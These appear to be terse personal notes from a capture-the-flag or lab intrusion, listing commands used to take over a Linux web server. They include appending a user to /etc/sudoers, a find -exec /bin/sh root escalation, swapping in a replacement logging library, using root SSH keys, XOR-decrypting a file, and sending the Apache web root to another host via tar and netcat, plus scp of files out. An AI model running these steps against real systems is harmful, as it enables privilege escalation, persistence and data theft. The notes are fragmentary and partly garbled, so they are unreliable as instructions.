rm .bashrhc
nano /opt/brilliant_script.sh

#!/bin/sh

echo "alex ALL=(ALL:ALL) ALL" >> /etc/sudoers; 

sudo find /etc/passwd -exec /bin/sh \; => root

service ssh start
service cron start
httpd-foreground
-- 단서 ? 

cd /lib/x86_64-linux-gnu
sudo mv oldliblogging.so liblogging.so

/root/.ssh/authorized_keys 

strings fixutil | grep "fixutil"

/usr/local/apache2/htdocs/ 
/opt/.fixutil/
/opt/.fixutil/backup.txt  --> key 

xortool -d reallyimportant.txt myfile.txt

AdsipPewFlfkmll

scp * alex@10.10.204.111:/home/alex/

150c1a1a5024000f324c02040e1901240a074919234505230d0a07144c052c141c1b04310b0368662f4b05031c24441d0604380c19214c0e0a1d1c092f17531d1f700c037d4c2f4b0e0d026610530b153117573204034b19040334031b1d503f03572a03091804020b610d0747

nc -lvp 9007 > backup.tar 
cd /usr/local/apache2/htdocs 
tar -cvf backup.tar * 
nc 10.10.74.101 9007 < backup.tar
